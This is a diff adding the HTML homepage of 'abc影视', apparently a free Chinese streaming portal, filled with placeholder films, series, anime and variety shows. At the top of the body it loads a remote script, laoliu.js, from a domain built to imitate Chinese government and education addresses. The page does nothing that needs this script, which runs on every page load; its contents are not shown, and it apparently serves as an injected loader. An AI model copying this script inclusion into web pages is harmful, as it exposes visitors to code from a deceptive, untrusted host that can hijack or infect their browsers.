@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>abc影视 - 免费高清电影电视剧动漫综艺在线观看</title>
+<meta name="description" content="abc影视提供最新电影、热播电视剧、动漫、综艺高清在线免费观看，移动端自适应，每日更新，畅享海量影视资源。">
+<meta name="keywords" content="abc影视,免费看影视,免费电影,在线影视,高清电视剧,动漫在线看">
+<link rel="canonical" href="https://abcyingshi-h5.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:#0b0d12;color:#e6e6e6;line-height:1.7;
+}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+section[id]{scroll-margin-top:70px}
+
+/* 导航 */
+.topbar{
+  position:fixed;top:0;left:0;right:0;z-index:999;
+  background:rgba(11,13,18,.85);
+  backdrop-filter:blur(10px);
+  border-bottom:1px solid rgba(255,255,255,.08);
+}
+.topbar-inner{
+  max-width:1200px;margin:0 auto;
+  height:60px;padding:0 16px;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.brand{
+  font-size:20px;font-weight:800;color:#fff;
+}
+.brand b{color:#ff4d4f}
+.nav{display:flex;gap:18px}
+.nav a{font-size:14px;color:#9aa0aa}
+.nav a:hover{color:#ff4d4f}
+
+/* Hero */
+.hero{
+  margin-top:60px;
+  padding:90px 16px 70px;
+  text-align:center;
+  background:
+    radial-gradient(1200px 400px at 50% -10%,rgba(255,77,79,.25),transparent),
+    linear-gradient(180deg,#11141c,#0b0d12);
+}
+.hero h1{
+  font-size:34px;font-weight:900;color:#fff;margin-bottom:14px;
+}
+.hero h1 span{color:#ff4d4f}
+.hero p{
+  max-width:680px;margin:0 auto 26px;color:#aab1bd;font-size:16px;
+}
+.btn{
+  display:inline-block;padding:12px 30px;border-radius:30px;
+  background:#ff4d4f;color:#fff;font-weight:700;font-size:15px;
+}
+.btn:hover{background:#ff7875}
+
+/* 区块 */
+.wrap{max-width:1200px;margin:0 auto;padding:60px 16px}
+.sec-head{
+  display:flex;align-items:center;justify-content:space-between;
+  margin-bottom:24px;
+}
+.sec-head h2{font-size:22px;color:#fff}
+.sec-head h2 i{color:#ff4d4f;font-style:normal;margin-right:8px}
+.sec-head a{font-size:13px;color:#7c828d}
+.sec-head a:hover{color:#ff4d4f}
+
+/* 电影：网格卡片 */
+.movie-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(160px,1fr));
+  gap:16px;
+}
+.movie{
+  background:#141821;border:1px solid rgba(255,255,255,.06);
+  border-radius:14px;overflow:hidden;transition:.3s;
+}
+.movie:hover{transform:translateY(-6px);border-color:rgba(255,77,79,.4)}
+.movie img{height:220px;object-fit:cover}
+.movie .info{padding:12px}
+.movie .info h3{font-size:15px;color:#fff}
+.movie .info p{font-size:12px;color:#8b919c;margin-top:4px}
+
+/* 电视剧：横向滚动 */
+.tv-scroll{
+  display:flex;gap:16px;overflow-x:auto;padding-bottom:10px;
+}
+.tv-scroll::-webkit-scrollbar{height:6px}
+.tv-scroll::-webkit-scrollbar-thumb{background:#333;border-radius:6px}
+.tv-item{
+  flex:0 0 300px;display:flex;gap:12px;
+  background:#141821;border:1px solid rgba(255,255,255,.06);
+  border-radius:12px;padding:10px;
+}
+.tv-item img{width:90px;height:120px;object-fit:cover;border-radius:8px}
+.tv-item h3{font-size:15px;color:#fff}
+.tv-item p{font-size:12px;color:#8b919c;margin-top:6px}
+.tv-item span{display:inline-block;margin-top:8px;font-size:11px;color:#ff4d4f}
+
+/* 动漫：时间轴 */
+.timeline{border-left:2px solid rgba(255,77,79,.4);padding-left:18px}
+.tl-item{
+  background:#141821;border:1px solid rgba(255,255,255,.06);
+  border-radius:12px;padding:14px;margin-bottom:16px;
+}
+.tl-item b{color:#ff4d4f;font-size:12px}
+.tl-item h3{font-size:16px;color:#fff;margin:6px 0}
+.tl-item p{font-size:13px;color:#9aa0aa}
+
+/* 综艺：大图+小图 */
+.variety{
+  display:grid;grid-template-columns:2fr 1fr 1fr;gap:16px;
+}
+.v-card{
+  position:relative;border-radius:14px;overflow:hidden;min-height:180px;
+}
+.v-card.big{grid-row:span 2;min-height:376px}
+.v-card img{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
+.v-card .mask{
+  position:absolute;inset:0;
+  background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.85));
+  display:flex;align-items:flex-end;padding:16px;
+}
+.v-card .mask h3{color:#fff;font-size:16px}
+
+/* 关于 */
+.about{
+  display:grid;grid-template-columns:1.2fr .8fr;gap:24px;align-items:center;
+}
+.about h2{font-size:24px;color:#fff;margin-bottom:14px}
+.about p{color:#aab1bd;font-size:15px;margin-bottom:10px}
+.about .url{color:#ff4d4f;font-weight:600}
+.stats{
+  display:grid;grid-template-columns:1fr 1fr;gap:12px;
+}
+.stat{
+  background:#141821;border:1px solid rgba(255,255,255,.06);
+  border-radius:12px;padding:18px;text-align:center;
+}
+.stat b{display:block;font-size:22px;color:#ff4d4f}
+.stat span{font-size:12px;color:#8b919c}
+
+/* 页脚 */
+.footer{
+  border-top:1px solid rgba(255,255,255,.08);
+  padding:30px 16px;text-align:center;color:#6b7280;font-size:13px;
+}
+.footer a{color:#8b919c;margin:0 8px}
+.footer a:hover{color:#ff4d4f}
+
+@media(max-width:768px){
+  .nav{display:none}
+  .hero h1{font-size:26px}
+  .variety{grid-template-columns:1fr}
+  .v-card.big{grid-row:auto;min-height:200px}
+  .about{grid-template-columns:1fr}
+  .movie img{height:200px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 导航 -->
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="brand">abc<b>影视</b></div>
+    <nav class="nav">
+      <a href="#home">首页</a>
+      <a href="#movie">电影</a>
+      <a href="#tv">电视剧</a>
+      <a href="#anime">动漫</a>
+      <a href="#variety">综艺</a>
+      <a href="#about">关于</a>
+    </nav>
+  </div>
+</div>
+
+<!-- 首页 -->
+<header class="hero" id="home">
+  <h1>abc影视 · <span>免费高清影视一站式观看</span></h1>
+  <p>abc影视聚合电影、电视剧、动漫、综艺资源，支持手机/平板/电脑自适应，更新快、画质高、无门槛。</p>
+  <a href="#movie" class="btn">立即免费观看</a>
+</header>
+
+<!-- 电影 -->
+<section class="wrap" id="movie">
+  <div class="sec-head">
+    <h2><i>🎬</i>最新电影</h2>
+    <a href="#">更多 #</a>
+  </div>
+  <div class="movie-grid">
+    <div class="movie"><img src="https://picsum.photos/300/420?random=101" alt="电影"><div class="info"><h3>电影标题一</h3><p>动作 / 2024 / 9.1分</p></div></div>
+    <div class="movie"><img src="https://picsum.photos/300/420?random=102" alt="电影"><div class="info"><h3>电影标题二</h3><p>喜剧 / 2024 / 8.7分</p></div></div>
+    <div class="movie"><img src="https://picsum.photos/300/420?random=103" alt="电影"><div class="info"><h3>电影标题三</h3><p>科幻 / 2023 / 8.9分</p></div></div>
+    <div class="movie"><img src="https://picsum.photos/300/420?random=104" alt="电影"><div class="info"><h3>电影标题四</h3><p>悬疑 / 2024 / 8.5分</p></div></div>
+    <div class="movie"><img src="https://picsum.photos/300/420?random=105" alt="电影"><div class="info"><h3>电影标题五</h3><p>爱情 / 2023 / 8.2分</p></div></div>
+    <div class="movie"><img src="https://picsum.photos/300/420?random=106" alt="电影"><div class="info"><h3>电影标题六</h3><p>动画 / 2024 / 8.8分</p></div></div>
+  </div>
+</section>
+
+<!-- 电视剧 -->
+<section class="wrap" id="tv" style="background:#0e1117">
+  <div class="sec-head">
+    <h2><i>📺</i>热播电视剧</h2>
+    <a href="#">更多 #</a>
+  </div>
+  <div class="tv-scroll">
+    <div class="tv-item"><img src="https://picsum.photos/180/240?random=111" alt="剧"><div><h3>电视剧名称一</h3><p>都市情感大剧，剧情紧凑，角色张力强。</p><span>更新至32集</span></div></div>
+    <div class="tv-item"><img src="https://picsum.photos/180/240?random=112" alt="剧"><div><h3>电视剧名称二</h3><p>古装权谋，阵容强大，口碑持续走高。</p><span>全40集</span></div></div>
+    <div class="tv-item"><img src="https://picsum.photos/180/240?random=113" alt="剧"><div><h3>电视剧名称三</h3><p>悬疑刑侦，反转不断，适合追更。</p><span>更新至18集</span></div></div>
+    <div class="tv-item"><img src="https://picsum.photos/180/240?random=114" alt="剧"><div><h3>电视剧名称四</h3><p>职场现实题材，台词犀利有共鸣。</p><span>全24集</span></div></div>
+  </div>
+</section>
+
+<!-- 动漫 -->
+<section class="wrap" id="anime">
+  <div class="sec-head">
+    <h2><i>🎨</i>动漫更新</h2>
+    <a href="#">更多 #</a>
+  </div>
+  <div class="timeline">
+    <div class="tl-item"><b>2024-09-20</b><h3>热门动漫一 第12集</h3><p>主角面对强敌，战斗画面全面升级。</p></div>
+    <div class="tl-item"><b>2024-09-18</b><h3>热门动漫二 第24集</h3><p>主线揭晓，世界观进一步展开。</p></div>
+    <div class="tl-item"><b>2024-09-15</b><h3>热门动漫三 第08集</h3><p>日常与战斗交织，角色成长明显。</p></div>
+    <div class="tl-item"><b>2024-09-12</b><h3>热门动漫四 第16集</h3><p>新反派登场，剧情进入高潮。</p></div>
+  </div>
+</section>
+
+<!-- 综艺 -->
+<section class="wrap" id="variety" style="background:#0e1117">
+  <div class="sec-head">
+    <h2><i>🎤</i>热门综艺</h2>
+    <a href="#">更多 #</a>
+  </div>
+  <div class="variety">
+    <div class="v-card big">
+      <img src="https://picsum.photos/800/600?random=121" alt="综艺">
+      <div class="mask"><h3>户外竞技大综艺：爆笑挑战赛</h3></div>
+    </div>
+    <div class="v-card">
+      <img src="https://picsum.photos/400/300?random=122" alt="综艺">
+      <div class="mask"><h3>音乐竞演秀</h3></div>
+    </div>
+    <div class="v-card">
+      <img src="https://picsum.photos/400/300?random=123" alt="综艺">
+      <div class="mask"><h3>旅行慢综艺</h3></div>
+    </div>
+    <div class="v-card">
+      <img src="https://picsum.photos/400/300?random=124" alt="综艺">
+      <div class="mask"><h3>美食探索节目</h3></div>
+    </div>
+    <div class="v-card">
+      <img src="https://picsum.photos/400/300?random=125" alt="综艺">
+      <div class="mask"><h3>脱口秀专场</h3></div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="wrap" id="about">
+  <div class="about">
+    <div>
+      <h2>关于 abc影视</h2>
+      <p>abc影视是一个面向移动端与桌面端的免费影视聚合展示站，内容覆盖电影、电视剧、动漫、综艺等主流品类。</p>
+      <p>页面采用响应式布局，加载轻量，结构清晰，方便搜索引擎理解页面主题。</p>
+      <p>官方地址：<span class="url">https://abcyingshi-h5.github.io</span></p>
+    </div>
+    <div class="stats">
+      <div class="stat"><b>10000+</b><span>影视内容</span></div>
+      <div class="stat"><b>4K</b><span>高清画质</span></div>
+      <div class="stat"><b>每天</b><span>资源更新</span></div>
+      <div class="stat"><b>0元</b><span>免费观看</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="footer">
+  <div>
+    <a href="#home">首页</a>|
+    <a href="#movie">电影</a>|
+    <a href="#tv">电视剧</a>|
+    <a href="#anime">动漫</a>|
+    <a href="#variety">综艺</a>|
+    <a href="#about">关于</a>
+  </div>
+  <p style="margin-top:12px">© 2024 abc影视 · 网站网址：https://abcyingshi-h5.github.io</p>
+</footer>
+
+</body>
+</html>
